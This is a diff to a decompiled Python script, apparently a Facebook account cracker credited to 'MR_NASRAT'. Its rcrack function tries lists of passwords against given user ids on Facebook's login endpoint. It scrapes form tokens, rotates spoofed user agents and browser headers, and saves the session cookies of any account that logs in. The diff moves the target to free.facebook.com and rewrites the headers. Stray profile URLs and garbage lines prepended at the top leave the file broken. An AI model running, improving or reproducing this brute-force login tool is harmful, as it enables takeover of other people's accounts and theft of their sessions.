@@ -1,3 +1,8 @@
+"https://mbasic.facebook.com/profile.php?id=100065533669299",
+import requests
+
+https://free.facebook.com/profile.php?id=100015315258519
+ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
 #WRITE  :BY MR_NASRAT
 #DECODE: BY NASRAT
 # Source Generated with Decompyle++
@@ -400,7 +405,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -411,29 +416,28 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-    'method': 'GET',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'sb=FHYDZZGMK254lxEqrqHh51L0; datr=FnYDZZSM_QTDHq9xcsf4bsrM; m_pixel_ratio=3; wd=360x728; fr=0jjUpsHhXNdD9Kt99..BlB1rC.yG.AAA.0.0.BlB1rf.AWUeU9Zo30c',
-    'dpr': '3',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5739.223", "Google Chrome";v="116.0.5739.223"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO CH7n"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 9; 100003562) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5739.223 Mobile Safari/537.36',
-    'viewport-width': '980',}
- 
-            lo = session.post('https://p.facebook.com/',data=log_data,headers=header_freefb).text,
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;JIHAD";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -459,6 +463,7 @@ def rcrack(uid,pwx,tl):
         pass
  
 NASRAT()
+
 
 
 
